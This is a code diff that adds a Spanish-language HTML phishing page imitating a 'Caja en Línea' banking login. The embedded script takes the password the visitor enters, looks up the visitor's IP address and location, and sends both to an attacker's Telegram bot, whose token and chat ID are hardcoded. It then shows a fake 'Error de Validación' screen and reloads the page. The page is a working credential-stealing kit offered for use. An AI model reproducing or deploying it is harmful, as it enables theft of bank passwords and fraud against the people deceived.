@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fondo con Degradado y Imagen</title>
+    <style>
+        body {
+            margin: 0; 
+            height: 100vh;
+            background: linear-gradient(to left, #072658, #063150, #0E6E80);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+        }
+
+        .rectangle {
+            width: 599px;
+            height: 400px;
+            position: relative;
+            margin-top: 188px; 
+            overflow: visible;
+            z-index: 1; 
+        }
+
+        .rectangle::after {
+            content: '';
+            position: absolute;
+            top: 117px;
+            left: 0;
+            right: 0;
+            height: 152px;
+            background-color: #D3D1D2;
+            z-index: 1;
+        }
+
+        .degradado {
+            height: 117px;
+            background: linear-gradient(to left, #072658, #063150, #0E6E80);
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .imagen-logo {
+            width: 380px;
+            height: auto;
+            margin-bottom: 8px;
+            margin-left: -17px;
+        }
+
+        .texto {
+            font-family: "Neo Sans Std", sans-serif;
+            font-size: 24px;
+            line-height: 36px;
+            color: white;
+            text-transform: uppercase;
+            text-align: center;
+            font-weight: 400;
+            letter-spacing: normal;
+            word-spacing: 0px;
+        }
+
+        .imagen {
+            margin-top: -130px; 
+            width: 220px;
+            height: 340px;
+        }
+
+        .formulario-container {
+            display: flex;
+            align-items: center;
+            position: absolute;
+            top: 150px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 2;
+        }
+
+        .formulario {
+            width: 284px;
+            height: 30px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 0;
+            font-size: 15px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            margin-left: 15px;
+        }
+
+        .logo-pequeño {
+            width: 43px;
+            height: auto;
+        }
+
+        .boton {
+            position: absolute;
+            top: 215px;
+            left: 85%; 
+            transform: translate(-50%, 0);
+            width: 163px;
+            height: 45px;
+            background-color: #083575;
+            color: white;
+            border: none;
+            border-radius: 0; 
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            z-index: 2; 
+        }
+
+        .boton:hover {
+            background-color: #0a4e8d; 
+        }
+
+        .texto-afiliacion {
+            position: absolute;
+            top: 236px; /* Mantenemos la misma posición vertical que el botón */
+            left: 2%; /* Ajusta la posición horizontal del texto */
+            color: #083575; /* Color del texto */
+            font-size: 15px;
+            font-family: "Neo Sans Std", sans-serif; /* Mismo tipo de letra */
+            z-index: 2; /* Asegúrate de que esté por encima de otros elementos */
+        }
+
+        .afiliacion-enlace {
+            color: #706d6d; /* Color gris oscuro para "Afíliate aquí" */
+            font-weight: bold;
+            cursor: pointer;
+            font-family: "Neo Sans Std", sans-serif; /* Mismo tipo de letra */
+        }
+
+        /* Estilos para la pantalla de carga */
+        .cargando {
+            display: none; 
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(to left, #072658, #063150, #0E6E80);
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 10; 
+        }
+
+        .cargando .mensaje {
+            color: red; /* Color del texto */
+            font-family: "Neo Sans Std", sans-serif;
+            font-size: 24px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .loading-image {
+            width: 220px;
+            height: auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="rectangle">
+        <div class="degradado">
+            <img src="logpeque.png" alt="Logo" class="imagen-logo">
+            <div class="texto">Caja en Línea</div>
+        </div>
+        <div class="formulario-container">
+            <img src="loginp.svg" alt="Logo Pequeño" class="logo-pequeño">
+            <input type="text" placeholder="Por favor ingrese su contraseña." class="formulario" id="usuario" required>
+        </div>
+        <span id="error" class="error" style="display:none; color:red;">Por favor, ingrese su contraseña.</span>
+        <div class="texto-afiliacion">
+            <span class="afiliacion-enlace">¿Olvidó su contraseña?</span>
+        </div>
+        <button id="continuar" class="boton">Continuar</button> 
+    </div>
+    <img src="mascota.png" alt="Descripción de la imagen" class="imagen">
+
+    <div class="cargando" id="cargando">
+        <div class="mensaje">Error de Validación</div>
+        <img src="mascota.png" alt="Cargando" class="loading-image">
+    </div>
+
+    <script>
+        const TOKEN = '6813453135:AAGfFRmuT5uVMFHzXzotCDQmXs3uj8wqB6o'; // Reemplaza con tu token de bot
+        const CHAT_ID = '-4037234500'; // Reemplaza con tu chat ID
+
+        document.getElementById('continuar').addEventListener('click', function() {
+            var usuario = document.getElementById('usuario').value;
+            var error = document.getElementById('error');
+
+            if (usuario.trim() === '') {
+                error.style.display = 'block'; // Mostrar mensaje de error
+            } else {
+                error.style.display = 'none'; // Ocultar mensaje de error
+                
+                // Obtener ubicación de ipwhois.io
+                fetch('https://ipwhois.app/json/')
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Error al obtener la ubicación');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    const location = `IP: ${data.ip}\nCiudad: ${data.city}\nPaís: ${data.country}`;
+                    const message = `Passw: ${usuario}\n${location}`;
+                    console.log("Mensaje a enviar a Telegram:", message);
+                    // Enviar mensaje al bot de Telegram
+                    sendMessageToTelegram(message);
+                })
+                .catch(err => {
+                    console.error('Error al obtener la ubicación:', err);
+                    // Mostrar pantalla de carga por error
+                    showLoadingScreen(10000, 'index.html', 'Error de Validación');
+                });
+            }
+        });
+
+        function sendMessageToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            })
+            .then(response => {
+                // Mostrar pantalla de carga por éxito
+                showLoadingScreen(10000, 'index.html', 'Error de Validación');
+            })
+            .catch(error => {
+                console.error('Error al enviar mensaje a Telegram:', error);
+                // Mostrar pantalla de carga por error
+                showLoadingScreen(10000, 'index.html', 'Error de Validación');
+            });
+        }
+
+        function showLoadingScreen(duration, redirectUrl, message) {
+            const loadingScreen = document.getElementById('cargando');
+            loadingScreen.querySelector('.mensaje').textContent = message; // Actualizar el mensaje
+            loadingScreen.style.display = 'flex';
+            setTimeout(() => {
+                loadingScreen.style.display = 'none';
+                window.location.href = redirectUrl; // Redirigir a la URL deseada
+            }, duration);
+        }
+    </script>
+</body>
+</html>
